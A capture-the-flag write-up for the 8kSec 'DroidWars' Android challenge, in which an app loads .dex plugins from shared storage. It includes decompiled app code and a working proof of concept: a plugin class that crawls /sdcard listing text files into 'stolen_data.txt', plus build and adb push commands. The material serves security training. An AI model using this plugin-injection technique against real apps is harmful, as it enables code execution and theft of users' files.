**Description**: Experience the thrill of battle in DroidWars, a customizable Android gaming platform where players can expand their gaming experience with powerful plugins!

**Link**: https://academy.8ksec.io/course/android-application-exploitation-challenges

![[8ksec-DroidWars_1.png]]

Install the `.apk` file using **ADB**
```bash
adb install -r DroidWars.apk
```

Give the *storage permissions* to the app.


We can see the screen with *Pikachu*, and also, the *settings button*.

And finally, 4 buttons with some functions.

Let's focus on the **source code** using **JADX**.

In `AndroidManifest.xml` file, we can't see something useful. Just the *package name* `com.eightksec.droidwars` and the *Main Activity* class.

But, it's important that in the manifest we can check for permissions:

- `READ_EXTERNAL_STORAGE`

- `WRITE_EXTERNAL_STORAGE` (up to SDK 29)

- `MANAGE_EXTERNAL_STORAGE` (Android ≥ 11)

This **grants full access to `/sdcard`**.

So, now it's time of *java code*.

First, let's see the **`MainActivity`** class.

I'll use the `checkForExploitEvidence()` for see **if the exploit** was *worked*.
```java
public final void checkForExploitEvidence() {  
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {  
            Toast.makeText(this, "Storage permission needed to check for exploit", 0).show();  
            return;  
        }  
        for (File file : CollectionsKt.listOf((Object[]) new File[]{new File(Environment.getExternalStorageDirectory(), "stolen_data.txt"), new File("/sdcard/stolen_data.txt"), new File(Environment.getExternalStorageDirectory(), "PokeDex/stolen_data.txt"), new File(getExternalFilesDir(null), "stolen_data.txt")})) {  
            if (file.exists() && file.canRead()) {  
                try {  
                    Charset defaultCharset = Charset.defaultCharset();  
                    Intrinsics.checkNotNullExpressionValue(defaultCharset, "defaultCharset(...)");  
                    String readText = FilesKt.readText(file, defaultCharset);  
                    logOutput("⚠️ EXPLOIT EVIDENCE FOUND AT: " + file.getAbsolutePath());  
                    logOutput("--- STOLEN DATA CONTENT ---");  
                    logOutput(readText);  
                    logOutput("--- END OF STOLEN DATA ---");  
                } catch (Exception e) {  
                    logOutput("Error reading exploit data: " + e.getMessage());  
                }  
                new AlertDialog.Builder(this).setTitle("⚠️ SECURITY BREACH DETECTED").setMessage("The application has been exploited and data has been stolen. Evidence found at: " + file.getAbsolutePath()).setPositiveButton("OK", (DialogInterface.OnClickListener) null).show();  
                return;  
            }  
        }  
        logOutput("No evidence of exploit found in common locations");  
        Toast.makeText(this, "No exploit evidence found", 0).show();  
    }
```

So, *as goal*, we can try create the *`stole_data.txt`* file **using the malicious plugin**.

I think that is *intentional* due that in our plugin we can set any name, except `stole_data` as name.

Also, *the function* `loadExternalPlugins()` will **add the plugin**:
```java
private final void loadExternalPlugins() {
    File file = new File(PluginLoader.PLUGINS_DIR);
    if (!file.exists()) {
        file.mkdirs();
    }
    PluginLoader pluginLoader = this.pluginLoader;
    PluginAdapter pluginAdapter = null;
    if (pluginLoader == null) {
        Intrinsics.throwUninitializedPropertyAccessException("pluginLoader");
        pluginLoader = null;
    }
    List<String> availablePlugins = pluginLoader.getAvailablePlugins();
    if (availablePlugins.isEmpty()) {
        logOutput("No external Pokémon plugins found in /sdcard/PokeDex/plugins/");
        return;
    }
    for (String str : availablePlugins) {
        logOutput("Attempting to load Pokémon plugin: " + str);
        PluginLoader pluginLoader2 = this.pluginLoader;
        if (pluginLoader2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("pluginLoader");
            pluginLoader2 = null;
        }
        PokemonPlugin loadPlugin = pluginLoader2.loadPlugin(str);
        if (loadPlugin != null) {
            List<PokemonPlugin> list = this.loadedPokemons;
            if (!(list instanceof Collection) || !list.isEmpty()) {
                Iterator<T> it = list.iterator();
                while (it.hasNext()) {
                    if (Intrinsics.areEqual(((PokemonPlugin) it.next()).getName(), loadPlugin.getName())) {
                        break;
                    }
                }
            }
            this.loadedPokemons.add(loadPlugin);
            logOutput("Successfully loaded Pokémon: " + loadPlugin.getName());
        } else {
            logOutput("Failed to load Pokémon plugin: " + str);
        }
    }
    PluginAdapter pluginAdapter2 = this.pokemonAdapter;
    if (pluginAdapter2 == null) {
        Intrinsics.throwUninitializedPropertyAccessException("pokemonAdapter");
    } else {
        pluginAdapter = pluginAdapter2;
    }
    pluginAdapter.updatePokemon(this.loadedPokemons);
}
```

We mus put the `.dex` file into `/sdcard/PokeDex/plugins/` directory.

We can see *multiple calls* to **`PluginLoader`** class.

Finally we can see the `clearPluginCache()` function, **which will remove** all `.dex` files in the storage.

So, it's **`PluginLoader`** class time.
```java
public static final Companion INSTANCE = new Companion(null);
public static final String PLUGINS_DIR = "/sdcard/PokeDex/plugins/";
private static final String PLUGIN_INTERFACE = "com.eightksec.droidwars.plugin.PokemonPlugin";
private static final String SIMPLE_PLUGIN_INTERFACE = "SimplePlugin";
private static final String TAG = "PluginLoader";
```

In this class, the app *copy the plugins* from `/sdcard/PokeDex/plugins/` to `private_plugins` as we can see in this piece of code:
```java
File file2 = new File(this.context.getDir("private_plugins", 0), pluginName + ".dex");
if (!file2.exists() || file.lastModified() > file2.lastModified()) {
    FilesKt.copyTo$default(file, file2, true, 0, 4, null);
    file2.setReadOnly();
    Function1<? super String, Unit> function13 = this.onLogMessage;
    if (function13 != null) {
        function13.invoke("Created read-only copy of " + pluginName + ".dex");
    }
}
```

And then:
```java
DexClassLoader dexClassLoader = new DexClassLoader(
    file2.getAbsolutePath(),
    this.context.getDir("dex", 0).getAbsolutePath(),
    null,
    this.context.getClassLoader()
);
setupOutputMonitoring();
Object loadSimplePlugin = loadSimplePlugin(dexClassLoader, pluginName);
if (loadSimplePlugin != null) {
    Log.d(TAG, "Successfully loaded SimplePlugin implementation");
    Function1<? super String, Unit> function14 = this.onLogMessage;
    if (function14 != null) {
        function14.invoke("Successfully loaded SimplePlugin implementation");
    }
    return new SimplePluginAdapter(loadSimplePlugin);
}
```
We will use `DexClassLoader` for exploit our plugin.

Also, this *will search for desired naming conventions*:
```java
for (String str3 : CollectionsKt.listOf((Object[]) new String[]{
        pluginName + "Plugin",
        "MaliciousPlugin",
        StringsKt.removeSuffix(pluginName, (CharSequence) "_copy") + "Plugin",
        "com.eightksec.droidwars.plugin." + pluginName + "Plugin"
})) {
    try {
        String str4 = "Attempting to load class: " + str3;
        Function1<? super String, Unit> function15 = this.onLogMessage;
        if (function15 != null) {
            function15.invoke(str4);
        }
        loadClass = dexClassLoader.loadClass(str3);
    } catch (ClassNotFoundException unused) {
        String str5 = "Class not found: " + str3;
        Function1<? super String, Unit> function16 = this.onLogMessage;
        if (function16 != null) {
            function16.invoke(str5);
            Unit unit = Unit.INSTANCE;
        }
    } catch (Exception e2) {
        String str6 = "Error loading class " + str3 + ": " + e2.getMessage();
        Log.e(TAG, str6, e2);
        Function1<? super String, Unit> function17 = this.onLogMessage;
        if (function17 != null) {
            function17.invoke(str6);
            Unit unit2 = Unit.INSTANCE;
        }
    }
    if (PokemonPlugin.class.isAssignableFrom(loadClass)) {
        String str7 = "Successfully loaded plugin class: " + str3;
        Function1<? super String, Unit> function18 = this.onLogMessage;
        if (function18 != null) {
            function18.invoke(str7);
        }
    }
[...]
[...]
[...]
```

Which is:

- `<pluginName>Plugin`

- `MaliciousPlugin` (will trigger the suspicious code)

- `com.eightksec.droidwars.plugin.<pluginName>Plugin`

Also support **`SimplePlugin`**. Which use a **`Interface`**.
```java
public interface PokemonPlugin {  
    List<String> getAbilities();  
    String getDescription();  
    int getImageResourceId();  
    String getName();  
    Map<String, Integer> getStats();  
    String getType();  
}
```

Let's create the plugin and *steal all the `.txt`* files in `/sdcard`
### PoC

```bash
mkdir src
```

Our plugin (save as `ShadowLegend.java`):
```java
import java.io.*;
import java.util.*;

public class ShadowLegend {
    public ShadowLegend() {
        try {
	        // the txt file (this will trigger the "detection")
            File out = new File("/sdcard/PokeDex/stolen_data.txt");
            if (!out.exists()) new Thread(() -> writeEvidence(out)).start();
        } catch (Throwable ignored) {}
    }

    // use Simple Plugin Adapter
    public String getName() { return "Shadow Legend"; }
    public String getType() { return "Dark"; }
    @SuppressWarnings({"rawtypes","unchecked"})
    public Map getAllData() {
        Map m = new HashMap();
        m.put("description", "A silent assassin from the night.");
        m.put("imageResourceId", 0);
        m.put("abilities", Arrays.asList("Stealth","Shadow Steal"));
        Map stats = new HashMap();
        stats.put("HP",120); stats.put("Attack",100); stats.put("Defense",80);
        stats.put("Sp. Attack",110); stats.put("Sp. Defense",90); stats.put("Speed",120);
        m.put("stats", stats);
        return m;
    }

    private void writeEvidence(File out) {
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(out, false))) {
            bw.write("!!!Exploit!!!\n");
            // list .txt files in sdcard
            File root = new File("/sdcard");
            int wrote = 0;
            Deque<File> q = new ArrayDeque<>();
            q.add(root);
            while (!q.isEmpty() && wrote < 50) {
                File d = q.removeFirst();
                File[] list = d.listFiles();
                if (list == null) continue;
                for (File f : list) {
                    if (f.isDirectory()) { q.addLast(f); continue; }
                    if (f.getName().toLowerCase().endsWith(".txt")) {
                        bw.write("[+] " + f.getAbsolutePath() + "\n");
                        wrote++;
                        if (wrote >= 50) break;
                    }
                }
            }
            bw.flush();
        } catch (Throwable ignored) {}
    }
}
```

```bash
mkdir -p build/classes build/dex
```

And here's the *compilation process*:
```bash
javac -encoding UTF-8 -source 1.8 -target 1.8 -d build/classes src/ShadowLegend.java
```

```bash
jar -cf build/classes.jar -C build/classes .
```

```bash
d8 --min-api 24 --release --output build/dex build/classes.jar
```

Send the generated `classes.dex` file *into our device*:
```bash
adb push build/dex/classes.dex /sdcard/PokeDex/plugins/ShadowLegend.dex
```

Refresh the **Poké`Dex`** and the new Pokemon will appear!
![[8ksec-DroidWars_2.png]]

Let's **Check Exploit** and we can notice that the *plugin works*!
![[8ksec-DroidWars_3.png]]

Also, **enable the Debug Log** and we can see the *stolen information*
![[8ksec-DroidWars_4.png]]

I hope you found it useful (:
